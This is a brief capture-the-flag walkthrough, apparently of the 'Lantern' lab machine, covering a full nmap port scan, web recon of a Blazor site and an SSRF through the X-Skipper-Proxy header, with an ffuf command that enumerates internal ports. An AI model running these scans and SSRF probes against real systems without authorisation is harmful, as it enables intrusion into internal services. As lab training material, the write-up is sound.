Port Scanning

I start by scanning all ports to identify available services: 

nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN lantern_scan 10.10.11.29

The scan redirects us to a web page:

I add the domain to /etc/hosts: 

nano /etc/hosts

Initial Web Recon

At first glance, nothing interesting is visible. Subdomain enumeration fails. The server uses Blazor (.NET), so it may have DLL files.

A POST request exists at /vacancies, possibly vulnerable to SSRF. It only accepts PDFs.

SSRF Exploitation

The server is vulnerable via X-Skipper-Proxy:

X-Skipper-Proxy v0.13.237 - Server Side Request Forgery (SSRF)

This allows reading local files on the server.

Using Burp Suite, I intercept the GET request and modify it to perform SSRF.

Port Discovery via SSRF

I use FFUF to enumerate internal ports: 

ffuf -u http://lantern.htb/ -H "X-Skipper-Proxy: http://localhost:FUZZ" -w /usr/share/seclists/Discovery/Infrastructure/common-http-ports.txt
